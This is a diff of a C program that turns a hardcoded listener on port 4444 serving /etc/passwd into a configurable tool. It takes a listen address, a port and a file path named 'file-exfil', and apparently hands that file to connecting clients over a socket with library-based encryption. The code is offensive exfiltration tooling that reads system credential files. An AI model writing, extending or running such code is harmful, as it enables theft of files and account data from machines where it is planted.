@@ -6,34 +6,29 @@
 #include <stdio.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/random.h>
 
 kp_size rng_interface(u8 *bytes, kp_size size)
 {
-    kp_size chunks = size / 4;
-    u8 remainder = size % 4;
-    u32 *ptr = (u32 *)bytes;
-
-    for (kp_size i = 0; i < chunks; i++)
-    {
-        ptr[i] = rand();
-    }
-
-    if (remainder > 0)
-    {
-        u32 last = rand();
-        u8 *last_ptr = (u8 *)&last;
-
-        for (u8 i = 0; i < remainder; i++)
-        {
-            bytes[(chunks * 4) + i] = last_ptr[i];
-        }
-    }
-
-    return size;
+    return getrandom(bytes, size, 0);
 }
 
 int main(int argc, char **argv)
 {
+    char *LOCAL_ADDR;
+    u16 LOCAL_PORT;
+    char *FILE_EXFIL;
+    if (argc != 4)
+    {
+        printf("Usage: %s <listen_addr> <listen_port> <file-exfil>\n", argv[0]);
+        return 1;
+    }
+
+    LOCAL_ADDR = argv[1];
+    LOCAL_PORT = atoi(argv[2]);
+    FILE_EXFIL = argv[3];
+
     kp_dependency dep;
     kp_dependency_init(&dep);
     dep.kp_free_fn = free;
@@ -53,8 +48,8 @@ int main(int argc, char **argv)
 
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(4444);
-    addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    addr.sin_port = htons(LOCAL_PORT);
+    addr.sin_addr.s_addr = inet_addr(LOCAL_ADDR);
 
     int true = 1;
 
@@ -93,7 +88,7 @@ int main(int argc, char **argv)
             continue;
         }
 
-        FILE *file = fopen("/etc/passwd", "r");
+        FILE *file = fopen(FILE_EXFIL, "r");
 
         if (file == NULL)
         {
